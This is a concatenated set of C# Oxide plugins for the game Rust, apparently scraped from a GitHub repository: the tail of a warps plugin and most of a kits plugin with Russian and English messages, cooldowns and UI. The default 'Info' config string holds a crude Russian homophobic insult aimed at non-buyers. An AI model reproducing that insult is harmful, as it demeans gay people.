                {Key.PreventingWarp, "We prevented using warp <color=#ffff00>{name}</color> because you was sleeping or loading"},
                {Key.Permission, "You don't have permission to do that!"}
            };
            
            public enum Key
            { 
                EnteringWarp,
                PreventingWarp,
                Permission,
            }
        }

        #endregion

        #region API

        private void FillWarpsInformation(Dictionary<string, Vector3> warps)
        {
            foreach (var warp in config.warps)
            {
                warps.Add(warp.shortname, warp.position);
            }
        }
        
        private Dictionary<string, Vector3> GetAllWarpsWithPositions()
        {
            return config.warps.ToDictionary(x => x.shortname, y => y.position);
        }

        private string[] GetAllWarps()
        {
            return config.warps.Select(x => x.shortname).ToArray();
        }

        #endregion
        
        #region CollisionDetector v1.1
        
        private class CollisionDetector : MonoBehaviour
        {
            private SphereCollider collider;
            public float Delay = 1f;
            public float Radius;
            public Action<GameObject> OnGameObjectEnter;
            public Action<GameObject> OnGameObjectExit;
            public Action<BasePlayer> OnPlayerEnter;
            public Action<BasePlayer> OnPlayerExit;

            public static CollisionDetector Create()
            {
                var obj = new GameObject().AddComponent<CollisionDetector>();
                return obj;
            }

            public static CollisionDetector Create(BaseEntity entity)
            {
                if (entity.IsValid() == false)
                {
                    return null;
                }
                
                var obj = new GameObject().AddComponent<CollisionDetector>();
                obj.transform.SetParent(entity.transform, false);
                return obj;
            }

            private void Start()
            {
                if (Radius < 0.001f)
                {
                    Destroy(this);
                    throw new Exception("Failed to create collision detector because it was not setted up properly");
                }
                
                Invoke(nameof(AddCollider), Delay);
            }
            
            private void OnDestroy()
            {
                if (collider != null)
                {
                    Destroy(collider);
                }
            }

            private void AddCollider()
            {
                collider = gameObject.AddComponent<SphereCollider>();
                collider.radius = Radius;
                collider.isTrigger = true;
                collider.gameObject.layer = (int) Layer.Reserved1;
            }

            private void Enter(GameObject go)
            {
                if (OnGameObjectEnter != null)
                {
                    OnGameObjectEnter(go);
                }

                if (OnPlayerEnter != null)
                {
                    var player = go.ToBaseEntity() as BasePlayer;
                    if (player != null)
                    {
                        OnPlayerEnter(player);
                    }
                }
            }

            private void Exit(GameObject go)
            {
                if (OnGameObjectExit != null)
                {
                    OnGameObjectExit(go);
                }
                
                if (OnPlayerExit != null)
                {
                    var player = go.ToBaseEntity() as BasePlayer;
                    if (player != null)
                    {
                        OnPlayerExit(player);
                    }
                }
            }

            private void OnTriggerEnter(Collider component)
            {
                var go = component.gameObject;
                if (go != null)
                {
                    Enter(go);
                }
            }

            private void OnCollisionEnter(Collision component)
            {
                var go = component.gameObject;
                if (go != null)
                {
                    Enter(go);
                }
            }

            private void OnTriggerExit(Collider component)
            {
                var go = component.gameObject;
                if (go != null)
                {
                    Exit(go);
                }
            }

            private void OnCollisionExit(Collision component)
            {
                var go = component.gameObject;
                if (go != null)
                {
                    Exit(go);
                }
            }
        }

        #endregion
        
        #region Configuration v2.1

        protected override void LoadConfig()
        {
            base.LoadConfig();

            try
            {
                config = Config.ReadObject<ConfigDefinition>();
                if (config == null)
                {
                    LoadDefaultConfig();
                }
            }
            catch
            {
                for (var i = 0; i < 3; i++)
                {
                    PrintError("Configuration file is corrupt! Check your config file at https://jsonlint.com/");
                }
                
                LoadDefaultConfig();
                return;
            }

            ValidateConfig();
            SaveConfig();
        }

        private void ValidateConfig()
        {
            if (Interface.Oxide.CallHook("OnConfigValidate") != null)
            {
                PrintWarning("Using default configuration...");
                config = new ConfigDefinition();
            }
        }

        protected override void LoadDefaultConfig()
        {
            config = new ConfigDefinition();
        }

        protected override void SaveConfig()
        {
            Config.WriteObject(config);
        }

        #endregion

        #region Language System v2.3

        protected override void LoadDefaultMessages()
        {
            Message.Load(lang, this);
        }

        private partial class Message
        {
            private static RustPlugin plugin;
            private static Lang lang;
            private static ulong senderID = 0;

            public static void ChangeSenderID(ulong newValue)
            {
                senderID = newValue;
            }

            public static void Load(Lang v1, RustPlugin v2)
            {
                lang = v1;
                plugin = v2;

                var dictionary = new Dictionary<string, string>();
                foreach (var pair in messages)
                {
                    var key = pair.Key.ToString();
                    var value = pair.Value.ToString();
                    dictionary.TryAdd(key, value);
                }

                lang.RegisterMessages(dictionary, plugin);
            }

            public static void Unload()
            {
                lang = null;
                plugin = null;
            }

            public static void Console(string message, Type type = Type.Normal)
            {
                message = $"[{plugin.Name}] {message}";
                switch (type)
                {
                    case Type.Normal:
                        Debug.Log(message);
                        break;

                    case Type.Warning:
                        Debug.LogWarning(message);
                        break;

                    case Type.Error:
                        Debug.LogError(message);
                        break;
                }
            }

            public static void Send(object receiver, string message, params object[] args)
            {
                message = FormattedMessage(message, args);
                SendMessage(receiver, message);
            }

            public static void Send(object receiver, Key key, params object[] args)
            {
                var userID = (receiver as BasePlayer)?.UserIDString;
                var message = GetMessage(key, userID, args);
                SendMessage(receiver, message);
            }

            public static void Broadcast(string message, params object[] args)
            {
                foreach (var player in BasePlayer.activePlayerList)
                {
                    message = FormattedMessage(message, args);
                    SendMessage(player, message);
                }
            }

            public static void Broadcast(Key key, params object[] args)
            {
                foreach (var player in BasePlayer.activePlayerList)
                {
                    var message = GetMessage(key, player.UserIDString, args);
                    SendMessage(player, message);
                }
            }

            public static string GetMessage(Key key, string playerID = null, params object[] args)
            {
                var keyString = key.ToString();
                var message = lang.GetMessage(keyString, plugin, playerID);
                if (message == keyString)
                {
                    return $"{keyString} is not defined in plugin!";
                }

                if (Interface.CallHook("OnLanguageValidate") != null)
                {
                    message = messages.FirstOrDefault(x => x.Key == key).Value as string;
                }

                return FormattedMessage(message, args);
            }

            public static string FormattedMessage(string message, params object[] args)
            {
                if (args != null && args.Length > 0)
                {
                    var organized = OrganizeArgs(args);
                    return ReplaceArgs(message, organized);
                }

                return message;
            }

            private static void SendMessage(object receiver, string message)
            {
                if (receiver == null || string.IsNullOrEmpty(message))
                {
                    return;
                }

                BasePlayer player = null;
                IPlayer iPlayer = null;
                ConsoleSystem.Arg console = null;

                if (receiver is BasePlayer)
                {
                    player = receiver as BasePlayer;
                }

                if (player == null && receiver is IPlayer)
                {
                    iPlayer = receiver as IPlayer;
                    player = BasePlayer.Find(iPlayer.Id);
                }

                if (player == null && receiver is ConsoleSystem.Arg)
                {
                    console = receiver as ConsoleSystem.Arg;
                    player = console.Connection?.player as BasePlayer;
                    message = $"[{plugin?.Name}] {message}";
                }

                if (player == null && receiver is Component)
                {
                    var obj = receiver as Component;
                    player = obj.GetComponent<BasePlayer>() ?? obj.GetComponentInParent<BasePlayer>() ?? obj.GetComponentInChildren<BasePlayer>();
                }

                if (player == null)
                {
                    message = $"[{plugin?.Name}] {message}";
                    Debug.Log(message);
                    return;
                }

                if (player.IsConnected == false)
                {
                    return;
                }
                
                if (console != null)
                {
                    player.SendConsoleCommand("echo " + message);
                }

                if (senderID > 0)
                {
                    if (Interface.CallHook("OnMessagePlayer", message, player) != null)
                    {
                        return;
                    }

                    player.SendConsoleCommand("chat.add", (object) 2, (object) senderID, (object) message);
                }
                else
                {
                    player.ChatMessage(message);
                }
            }
            
            private static Dictionary<string, object> OrganizeArgs(object[] args)
            {
                var dic = new Dictionary<string, object>();
                for (var i = 0; i < args.Length; i += 2)
                {
                    var value = args[i].ToString();
                    var nextValue = i + 1 < args.Length ? args[i + 1] : null;
                    dic.TryAdd(value, nextValue);
                }

                return dic;
            }

            private static string ReplaceArgs(string message, Dictionary<string, object> args)
            {
                if (args == null || args.Count < 1)
                {
                    return message;
                }

                foreach (var pair in args)
                {
                    var s0 = "{" + pair.Key + "}";
                    var s1 = pair.Key;
                    var s2 = pair.Value != null ? pair.Value.ToString() : "null";
                    message = message.Replace(s0, s2, StringComparison.InvariantCultureIgnoreCase);
                    message = message.Replace(s1, s2, StringComparison.InvariantCultureIgnoreCase);
                }

                return message;
            }

            public enum Type
            {
                Normal,
                Warning,
                Error
            }
        }
        
        #endregion
    }
}


// --- End of file: Warps.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/TPKits.cs ---
// --- Original Local Path: TPKits.cs ---

﻿ using System.ComponentModel;
using Newtonsoft.Json;
using Oxide.Core;
using Oxide.Core.Plugins;
using Oxide.Game.Rust.Cui;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Linq;
using UnityEngine;
namespace Oxide.Plugins
{
    [Info("TPKits", "Sempai#3239", "5.0.0")]
    class TPKits : RustPlugin
    {
        [PluginReference] Plugin ImageLibrary;
        static TPKits ins;
        private PluginConfig config;
        private List<Kit> kitsList;
        private Dictionary<ulong, Dictionary<string, KitData>> PlayersData;
        private Dictionary<BasePlayer, List<Kit>> OpenGUI = new Dictionary<BasePlayer, List<Kit>>();
        public List<BasePlayer> AdminSetting = new List<BasePlayer>();
        private class RarityColor
        {
            [JsonProperty("Шанс выпадения предмета данной редкости")] public int Chance;
            [JsonProperty("Цвет этой редкости в интерфейсе")] public string Color;
            public RarityColor(int chance, string color)
            {
                Chance = chance;
                Color = color;
            }
        }
        class PluginConfig
        {
            [JsonProperty("Кастомные автокиты по привилегии (Привилегию устанавливаете в настройке кита) | Custom autokit, install privilege in the configuration of the kit")] public List<string> CustomAutoKits;
            [JsonProperty("Префикс чата | Chat Prefix")]
            public string DefaultPrefix
            {
                get;
                set;
            }
            [JsonProperty("Информация плагина")] public string Info = "Ахуенный плагин скилов всем советую, а кто не купит, тот гомосек";
            [JsonProperty("Настройка цвета предмета по шансу")] public List<RarityColor> RaritiesColor = new List<RarityColor>();
            [JsonProperty("Версия конфигурации | Configuration Version")] public VersionNumber PluginVersion = new VersionNumber();
            public static PluginConfig CreateDefault()
            {
                return new PluginConfig
                {
                    CustomAutoKits = new List<string>() {
                        "autokit1", "autokit2"
                    }
                    ,
                    DefaultPrefix = "[Kit]",
                    PluginVersion = new VersionNumber(),
                    RaritiesColor = new List<RarityColor> {
                        new RarityColor(40, "1.00 1.00 1.00 0.3"), new RarityColor(30, "0.68 0.87 1.00 0.3"), new RarityColor(20, "0.77 0.65 1.00 0.3"), new RarityColor(10, "1.00 0.68 0.17 0.3"),
                    }
                    ,
                }
                ;
            }
        }
        public class Kit
        {
            public string Name
            {
                get;
                set;
            }
            public string DisplayName
            {
                get;
                set;
            }
            public string CustomImage
            {
                get;
                set;
            }
            public int Amount
            {
                get;
                set;
            }
            public double Cooldown
            {
                get;
                set;
            }
            public bool Hide
            {
                get;
                set;
            }
            public string Permission
            {
                get;
                set;
            }
            public string Color
            {
                get;
                set;
            }
            public List<KitItem> Items
            {
                get;
                set;
            }
        }
        public class KitItem
        {
            public string ShortName
            {
                get;
                set;
            }
            public int Amount
            {
                get;
                set;
            }
            public int Blueprint
            {
                get;
                set;
            }
            public ulong SkinID
            {
                get;
                set;
            }
            public string Container
            {
                get;
                set;
            }
            public float Condition
            {
                get;
                set;
            }
            public int Change
            {
                get;
                set;
            }
          
            public bool EnableCommand { get; set; }
            [JsonProperty("Command (Player identifier %STEAMID%)")]
            public string Command { get; set; }
            public string CustomImage { get; set; }
            public Weapon Weapon
            {
                get;
                set;
            }
            public List<ItemContent> Content
            {
                get;
                set;
            }
        }
        public class Weapon
        {
            public string ammoType
            {
                get;
                set;
            }
            public int ammoAmount
            {
                get;
                set;
            }
        }
        public class ItemContent
        {
            public string ShortName
            {
                get;
                set;
            }
            public float Condition
            {
                get;
                set;
            }
            public int Amount
            {
                get;
                set;
            }
        }
        public class KitData
        {
            public int Amount
            {
                get;
                set;
            }
            public double Cooldown
            {
                get;
                set;
            }
        }
        public class Position
        {
            public string AnchorMin
            {
                get;
                set;
            }
            public string AnchorMax
            {
                get;
                set;
            }
        }
        protected override void LoadDefaultConfig()
        {
            PrintWarning("Благодарим за приобритение плагина на сайте TopPlugin.ru. Если вы приобрели этот плагин на другом ресурсе знайте - это лишает вас гарантированных обновлений!");
            Config.Clear();
            Config.WriteObject(PluginConfig.CreateDefault(), true);
        }
        protected override void LoadConfig()
        {
            base.LoadConfig();
            config = Config.ReadObject<PluginConfig>();
            if (config.PluginVersion < Version) UpdateConfigValues();
            Config.WriteObject(config, true);
        }
        private void UpdateConfigValues()
        {
            PluginConfig baseConfig = PluginConfig.CreateDefault();
            if (config.PluginVersion < Version)
            {
                PrintWarning("Config update detected! Updating config values...");
                PrintWarning("Config update completed!");
            }
            config.PluginVersion = Version;
        }
        void OnPlayerRespawned(BasePlayer player)
        {
            foreach (var kits in config.CustomAutoKits)
            {
                if (kitsList.Exists(x => x.Name == kits))
                {
                    var kit1 = kitsList.First(x => x.Name.ToLower() == kits.ToLower());
                    if (permission.UserHasPermission(player.UserIDString, kit1.Permission))
                    {
                        player.inventory.Strip();
                        GiveItems(player, kit1);
                        return;
                    }
                }
            }
            if (kitsList.Exists(x => x.Name.ToLower() == "autokit"))
            {
                player.inventory.Strip();
                var kit = kitsList.First(x => x.Name.ToLower() == "autokit");
                GiveItems(player, kit);
            }
        }
        private void SaveKits()
        {
            Interface.Oxide.DataFileSystem.WriteObject("Kits/KitsList", kitsList);
        }
        private void SaveData()
        {
            if (PlayersData != null) Interface.Oxide.DataFileSystem.WriteObject("Kits/PlayersData", PlayersData);
        }
        void OnServerSave()
        {
            SaveData();
            SaveKits();
        }
        private void LoadMessages()
        {
            lang.RegisterMessages(new Dictionary<string, string>
            {
                ["Kit Was Removed"] = "{Prefix}: Kit {kitname} was removed",
                ["Kit Doesn't Exist"] = "{Prefix}: This kit doesn't exist",
                ["Not Found Player"] = "{Prefix}: Player not found",
                ["To Many Player"] = "{Prefix}: Found multipy players",
                ["Permission Denied"] = "{Prefix}: Access denied",
                ["Limite Denied"] = "{Prefix}: Useage limite reached",
                ["Cooldown Denied"] = "{Prefix}: You will be able to use this kit after {time}",
                ["Reset"] = "{Prefix}Kits data wiped",
                ["Kit Already Exist"] = "{Prefix}Kit with the same name already exist",
                ["Kit Created"] = "{Prefix}You have created a new kit - {name}",
                ["Kit Extradited"] = "{Prefix}You have claimed kit - {kitname}",
                ["Kit Cloned"] = "{Prefix}You inventory was copyed to the kit",
                ["UI Amount"] = "<b>Timeleft: {amount}</b>",
                ["UI COOLDOWN"] = "Cooldown: {cooldown}",
                ["UI EXIT"] = "<b>EXIT</b>",
                ["UI READ"] = "<b>READ MORE</b>",
                ["UI NOLIMIT"] = "<b>no limit</b>",
                ["UI LIMIT"] = "<b>Limit: {limit}</b>",
                ["UI NOGIVE"] = "<b>NOT AVAILABLE</b>",
                ["UI GIVE"] = "YOU CAN TAKE",
                ["Help"] = "/kit name|add|clone|remove|list|reset",
                ["Help Add"] = "/kit add <kitname>",
                ["Help Clone"] = "/kit clone <kitname>",
                ["Help Remove"] = "/kit remove <kitname>",
                ["Help Give"] = "/kit give <kitname> <playerName|steamID>",
                ["Give Succes"] = "You have successfully given the player {0} a set {1}",
                ["No Space"] = "Can't redeem kit. Not enought space",
                ["UI Item Info"] = "If you see a percentage on an item, it means that with the indicated probability you can get this one.",
                ["UI Admin ON"] = "DISPLAY ALL KITS",
                ["UI Admin OFF"] = "HIDE ALL KITS",
                ["UI No Available"] = "There are no available ktis for you.",
            }
            , this);
            lang.RegisterMessages(new Dictionary<string, string>
            {
                ["Kit Was Removed"] = "{Prefix}{kitname} был удалён",
                ["Kit Doesn't Exist"] = "{Prefix}Этого комплекта не существует",
                ["Not Found Player"] = "{Prefix}Игрок не найден",
                ["To Many Player"] = "{Prefix}Найдено несколько игроков",
                ["Permission Denied"] = "{Prefix}У вас нет полномочий использовать этот комплект",
                ["Limite Denied"] = "{Prefix}Вы уже использовали этот комплект максимальное количество раз",
                ["Cooldown Denied"] = "{Prefix}Вы сможете использовать этот комплект через {time}",
                ["Reset"] = "{Prefix}Вы обнулили все данные о использовании комплектов игроков",
                ["Kit Already Exist"] = "{Prefix}Этот набор уже существует",
                ["Kit Created"] = "{Prefix}Вы создали новый набор - {name}",
                ["Kit Extradited"] = "{Prefix}Вы получили комплект {kitname}",
                ["Kit Cloned"] = "{Prefix}Предметы были скопированы из инвентаря в набор",
                ["UI Amount"] = "<b>Осталось: {amount}</b>",
                ["UI READ"] = "ПОДРОБНЕЕ",
                ["UI EXIT"] = "<b>ВЫХОД</b>",
                ["UI NOLIMIT"] = "<b>неогр.</b>",
                ["UI LIMIT"] = "<b>Лимит: {limit}</b>",
                ["UI COOLDOWN"] = "ЗАДЕРЖКА: {cooldown}",
                ["UI NOGIVE"] = "<b>НЕ ДОСТУПНО</b>",
                ["UI GIVE"] = "МОЖНО БРАТЬ",
                ["Help"] = "/kit name|add|clone|remove|list|reset",
                ["Help Add"] = "/kit add <kitname>",
                ["Help Clone"] = "/kit clone <kitname>",
                ["Help Remove"] = "/kit remove <kitname>",
                ["Help Give"] = "/kit give <kitname> <playerName|steamID>",
                ["Give Succes"] = "Вы успешно выдали игрок {0} набор {1}",
                ["No Space"] = "Невозможно получить набор - недостаточно места в инвентаре",
                ["UI Item Info"] = "Если вы видете на предмете процент, это значит что с указанной вероятностью вы сможете получить его.",
                ["UI Admin ON"] = "ОТОБРАЗИТЬ ВСЕ НАБОРЫ",
                ["UI Admin OFF"] = "СПРЯТАТЬ ВСЕ НАБОРЫ",
                ["UI No Available"] = "Для Вас нету доступных наборов.",
            }
            , this, "ru");
        }
        private void Loaded()
        {
            config = Config.ReadObject<PluginConfig>();
            LoadData();
            LoadMessages();
        }
        void LoadData()
        {
            try
            {
                kitsList = Interface.Oxide.DataFileSystem.ReadObject<List<Kit>>("Kits/KitsList");
                PlayersData = Interface.Oxide.DataFileSystem.ReadObject<Dictionary<ulong, Dictionary<string, KitData>>>("Kits/PlayersData");
            }
            catch
            {
                kitsList = new List<Kit>();
                PlayersData = new Dictionary<ulong, Dictionary<string, KitData>>();
            }
            CheckKits();
        }
        private void Unload()
        {
            SaveData();
        }
        public bool AddImage(string url, string name, ulong skin) => (bool)ImageLibrary?.Call("AddImage", url, name, skin);
        public string GetImage(string shortname, ulong skin = 0) => (string)ImageLibrary.Call("GetImage", shortname, skin);
        private void OnServerInitialized()
        {
            ins = this;
            foreach (var kit in kitsList)
            {
                if (!permission.PermissionExists(kit.Permission)) permission.RegisterPermission(kit.Permission, this);
            }
            ImageLibrary.Call("AddImage", "https://rustage.su/img/server/ui/kit_main_bg.png", "fonKits");
            ImageLibrary.Call("AddImage", "https://rustage.su/img/server/ui/kit_modal.png", "fonDescriptionKit");
            ImageLibrary.Call("AddImage", "https://rustage.su/img/server/ui/kit_open_btn.png", "canOpen");
            ImageLibrary.Call("AddImage", "https://rustage.su/img/server/ui/kit_modal_items.png", "fonItemsKit");
            ImageLibrary.Call("AddImage", $"https://i.imgur.com/8iuRY3u.png", $"mailbox_1812087291");
            kitsList.ForEach(kit =>
            {
                if (!string.IsNullOrEmpty(kit.CustomImage))
                    ImageLibrary.Call("AddImage", kit.CustomImage, kit.CustomImage);
                kit.Items.ForEach(item =>
                {
                    ImageLibrary.Call("AddImage", $"https://rustlabs.com/img/items180/{item.ShortName}.png", item.ShortName);
                    if (!string.IsNullOrEmpty(item.CustomImage))
                        ImageLibrary.Call("AddImage", item.CustomImage, item.CustomImage);
                });
            });
        }
        void CheckKits()
        {
            kitsList.ForEach(kit =>
            {
                if (kit.Color == null) kit.Color = "0.55 0.68 0.31 0.6";
                kit.Items.ForEach(item =>
                {
                    if (item.Change <= 0) item.Change = 100;
                }
                );
            }
            );
            SaveKits();
        }
        private void OnPlayerDisconnected(BasePlayer player)
        {
            OpenGUI.Remove(player);
        }
        [ConsoleCommand("kit")]
        private void CommandConsoleKit(ConsoleSystem.Arg arg)
        {
            if (arg.Connection == null)
            {
                if (arg.Args[0].ToLower() == "give")
                {
                    var target = BasePlayer.Find(arg.Args[1]);
                    var kitname = arg.Args[2];
                    if (target != null) GiveKit(target, kitname, 0, true);
                    return;
                }
            }
            var player = arg?.Player();
            var page = int.Parse(arg.Args[1]);
            if (!arg.HasArgs()) return;
            var value = arg.Args[0].ToLower();
            GiveKit(player, value, page);
            InitilizeKitsUI(player, page);
            return;
        }
        [ChatCommand("kit")]
        private void CommandChatKit(BasePlayer player, string command, string[] args)
        {
            if (player == null) return;
            if (args.Length == 0) return;
            if (!player.IsAdmin)
            {
                GiveKit(player, args[0].ToLower(), 0);
                return;
            }
            switch (args[0].ToLower())
            {
                case "help":
                    SendReply(player, GetMsg("Help", player));
                    return;
                case "add":
                    if (args.Length < 2) SendReply(player, GetMsg("Help Add", player));
                    else KitCommandAdd(player, args[1].ToLower());
                    return;
                case "clone":
                    if (args.Length < 2) SendReply(player, GetMsg("Help Clone", player));
                    else KitCommandClone(player, args[1].ToLower());
                    return;
                case "remove":
                    if (args.Length < 2) SendReply(player, GetMsg("Help Remove", player));
                    else KitCommandRemove(player, args[1].ToLower());
                    return;
                case "list":
                    KitCommandList(player);
                    return;
                case "reset":
                    KitCommandReset(player);
                    return;
                case "give":
                    if (args.Length < 3)
                    {
                        SendReply(player, GetMsg("Help Give", player));
                    }
                    else
                    {
                        var foundPlayer = FindPlayer(player, args[1].ToLower());
                        if (foundPlayer == null) return;
                        SendReply(player, GetMsg("Give Succes", player), foundPlayer.displayName, args[2]);
                        KitCommandGive(player, foundPlayer, args[2].ToLower());
                    }
                    return;
                default:
                    GiveKit(player, args[0].ToLower(), 0);
                    return;
            }
        }
        private bool GiveKit(BasePlayer player, string kitname, int page = -1, bool admin = false)
        {
            if (string.IsNullOrEmpty(kitname)) return false;
            if (Interface.Oxide.CallHook("canRedeemKit", player) != null && page > -1) return false;
            if (!kitsList.Exists(x => x.Name.ToLower() == kitname.ToLower()))
            {
                SendReply(player, GetMsg("Kit Doesn't Exist", player));
                return false;
            }
            var kit = kitsList.First(x => x.Name.ToLower() == kitname.ToLower());
            if (!string.IsNullOrEmpty(kit.Permission) && !permission.UserHasPermission(player.UserIDString, kit.Permission) && !admin && page > -1)
            {
                SendReply(player, GetMsg("Permission Denied", player));
                return false;
            }
            var playerData = GetPlayerData(kitname, player.userID);
            if (kit.Amount > 0 && playerData.Amount >= kit.Amount && !admin && page > -1)
            {
                SendReply(player, GetMsg("Limite Denied", player));
                return false;
            }
            if (kit.Cooldown > 0 && !admin && page > -1)
            {
                var currentTime = GetCurrentTime();
                if (playerData.Cooldown > currentTime)
                {
                    SendReply(player, GetMsg("Cooldown Denied", player).Replace("{time}", TimeExtensions.FormatTime(TimeSpan.FromSeconds(playerData.Cooldown - currentTime))));
                    return false;
                }
            }
            int beltcount = kit.Items.Where(i => i.Container == "belt").Count();
            int wearcount = kit.Items.Where(i => i.Container == "wear").Count();
            int maincount = kit.Items.Where(i => i.Container == "main").Count();
            int totalcount = beltcount + wearcount + maincount;
            if ((player.inventory.containerBelt.capacity - player.inventory.containerBelt.itemList.Count) < beltcount || (player.inventory.containerWear.capacity - player.inventory.containerWear.itemList.Count) < wearcount || (player.inventory.containerMain.capacity - player.inventory.containerMain.itemList.Count) < maincount) if (totalcount > (player.inventory.containerMain.capacity - player.inventory.containerMain.itemList.Count))
                {
                    player.ChatMessage(GetMsg("No Space", player));
                    return false;
                }
            GiveItems(player, kit);
            if (page > -1)
            {
                if (kit.Amount > 0)
                {
                    playerData.Amount += 1;
                }
                if (kit.Cooldown > 0) playerData.Cooldown = GetCurrentTime() + kit.Cooldown;
                EffectNetwork.Send(new Effect("assets/prefabs/misc/xmas/presents/effects/unwrap.prefab", player, 0, Vector3.up, Vector3.zero)
                {
                    scale = UnityEngine.Random.Range(0f, 1f)
                }
                );
            }
            return true;
        }
        private void KitCommandAdd(BasePlayer player, string kitname)
        {
            if (kitsList.Exists(x => x.Name == kitname))
            {
                SendReply(player, GetMsg("Kit Already Exist", player));
                return;
            }
            kitsList.Add(new Kit
            {
                Name = kitname,
                DisplayName = kitname,
                Cooldown = 600,
                Hide = true,
                Permission = "kits.default",
                Amount = 0,
                Color = "0.55 0.68 0.31 0.6",
                Items = GetPlayerItems(player)
            }
            );
            permission.RegisterPermission($"kits.default", this);
            SendReply(player, GetMsg("Kit Created", player).Replace("{name}", kitname));
            SaveKits();
            SaveData();
        }
        private void KitCommandClone(BasePlayer player, string kitname)
        {
            if (!kitsList.Exists(x => x.Name == kitname))
            {
                SendReply(player, GetMsg("Kit Doesn't Exist", player));
                return;
            }
            kitsList.First(x => x.Name.ToLower() == kitname.ToLower()).Items = GetPlayerItems(player);
            SendReply(player, GetMsg("Kit Cloned", player).Replace("{name}", kitname));
            SaveKits();
        }
        private void KitCommandRemove(BasePlayer player, string kitname)
        {
            if (kitsList.RemoveAll(x => x.Name == kitname) <= 0)
            {
                SendReply(player, GetMsg("Kit Doesn't Exist", player));
                return;
            }
            SendReply(player, GetMsg("Kit Was Removed", player).Replace("{kitname}", kitname));
            SaveKits();
        }
        private void KitCommandList(BasePlayer player)
        {
            foreach (var kit in kitsList) SendReply(player, $"{kit.Name} - {kit.DisplayName}");
        }
        private void KitCommandReset(BasePlayer player)
        {
            PlayersData.Clear();
            SendReply(player, GetMsg("Reset", player));
        }
        private void KitCommandGive(BasePlayer player, BasePlayer foundPlayer, string kitname)
        {
            var reply = 1;
            if (reply == 0) { }
            if (!kitsList.Exists(x => x.Name == reply.ToString())) { }
            if (!kitsList.Exists(x => x.Name == kitname))
            {
                SendReply(player, GetMsg("Kit Doesn't Exist", player));
                return;
            }
            GiveItems(foundPlayer, kitsList.First(x => x.Name.ToLower() == kitname.ToLower()));
        }
        private void GiveItems(BasePlayer player, Kit kit)
        {
            foreach (var kitem in kit.Items)
            {
                if (kitem.EnableCommand && !string.IsNullOrEmpty(kitem.Command))
                {
                    Server.Command(kitem.Command.Replace("%STEAMID%", player.UserIDString));
                    continue;
                }
                GiveItem(player, BuildItem(kitem.ShortName, kitem.Amount, kitem.SkinID, kitem.Condition, kitem.Blueprint, kitem.Weapon, kitem.Content), kitem.Change, kitem.Container == "belt" ? player.inventory.containerBelt : kitem.Container == "wear" ? player.inventory.containerWear : player.inventory.containerMain);
            }
        }
        private void GiveItem(BasePlayer player, Item item, int percent, ItemContainer cont = null)
        {
            if (item == null) return;
            var inv = player.inventory;
            if (UnityEngine.Random.Range(1, 100) < percent)
            {
                var moved = item.MoveToContainer(cont) || item.MoveToContainer(inv.containerMain);
                if (!moved)
                {
                    if (cont == inv.containerBelt) moved = item.MoveToContainer(inv.containerWear);
                    if (cont == inv.containerWear) moved = item.MoveToContainer(inv.containerBelt);
                }
                if (!moved) item.Drop(player.GetCenter(), player.GetDropVelocity());
            }
        }
        private Item BuildItem(string ShortName, int Amount, ulong SkinID, float Condition, int blueprintTarget, Weapon weapon, List<ItemContent> Content)
        {
            Item item = ItemManager.CreateByName(ShortName, Amount > 1 ? Amount : 1, SkinID);
            item.condition = Condition;
            if (blueprintTarget != 0) item.blueprintTarget = blueprintTarget;
            if (weapon != null)
            {
                (item.GetHeldEntity() as BaseProjectile).primaryMagazine.contents = weapon.ammoAmount;
                (item.GetHeldEntity() as BaseProjectile).primaryMagazine.ammoType = ItemManager.FindItemDefinition(weapon.ammoType);
            }
            if (Content != null)
            {
                foreach (var cont in Content)
                {
                    Item new_cont = ItemManager.CreateByName(cont.ShortName, cont.Amount);
                    new_cont.condition = cont.Condition;
                    new_cont.MoveToContainer(item.contents);
                }
            }
            return item;
        }

        [ConsoleCommand("kits.page")]
        void cmdKitsPage(ConsoleSystem.Arg args)
        {
            var player = args.Player();
            var page = int.Parse(args.Args[0]);
            InitilizeKitsUI(player, page);
        }

        private void InitilizeUI(BasePlayer player)
        {
            var container = new CuiElementContainer();
            container.Add(new CuiElement
            {
                Name = "ui.kits" + ".Main",
                Parent = ".Mains",
                Components = 
                {
                    new CuiRawImageComponent { Png = (string)ImageLibrary.Call("GetImage", "fonKits"), Color = "1 1 1 1" },
                    new CuiRectTransformComponent { AnchorMin = "-0.315 -0.27", AnchorMax = "1.3 1.275", OffsetMax = "0 0" },
                }
            });

            CuiHelper.DestroyUi(player, $"ui.kits");
            CuiHelper.AddUi(player, container);
            InitilizeKitsUI(player, 0);
        }

        private void InitilizeKitsUI(BasePlayer player, int page)
        {
            var currentTime = GetCurrentTime();
            var kits = GetKitsForPlayer(player).Skip(4 * page).Take(4).ToList();
            var container = new CuiElementContainer();
            int i = 0;

            container.Add(new CuiPanel
            {
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                Image = { Color = "0 0 0 0" }
            }, "ui.kits" + ".Main", "ui.kits" + ".Main" + ".Layer");

            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "0.8 0.804", AnchorMax = "0.817 0.832" },
                Button = { Close = "Menu_UI", Color = "0 0 0 0" },
                Text = { Text = "" }
            }, "ui.kits" + ".Main" + ".Layer");

            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "0.78 0.805", AnchorMax = "0.795 0.833", OffsetMax = "0 0" },
                Button = { Color = "0 0 0 0", Command = "kitdesc" },
                Text = { Text = "?", Color = "1 1 1 0.7", Align = TextAnchor.MiddleCenter, FontSize = 16, Font = "robotocondensed-regular.ttf" }
            }, "ui.kits" + ".Main" + ".Layer");

            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "0.775 0.445", AnchorMax = "0.81 0.512" },
                Button = { Command = GetKitsForPlayer(player).Skip(4 * (page + 1)).Count() > 0 ? $"kits.page {page + 1}": $"", Color = "1 1 1 0" },
                Text = { Text = "" }
            }, "ui.kits" + ".Main" + ".Layer");

            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "0.19 0.445", AnchorMax = "0.226 0.512" },
                Button = { Command = page > 0 ? $"kits.page {page - 1}": $"", Color = "1 1 1 0" },
                Text = { Text = "" }
            }, "ui.kits" + ".Main" + ".Layer");

            foreach (var kit in kits)
            {
                var playerData = GetPlayerData(kit.Name, player.userID);

                container.Add(new CuiPanel
                {
                    RectTransform = 
                    {
                        AnchorMin = $"{0.232 + (i * 0.138)} 0.38",
                        AnchorMax = $"{0.353 + (i * 0.138)} 0.595"
                    },
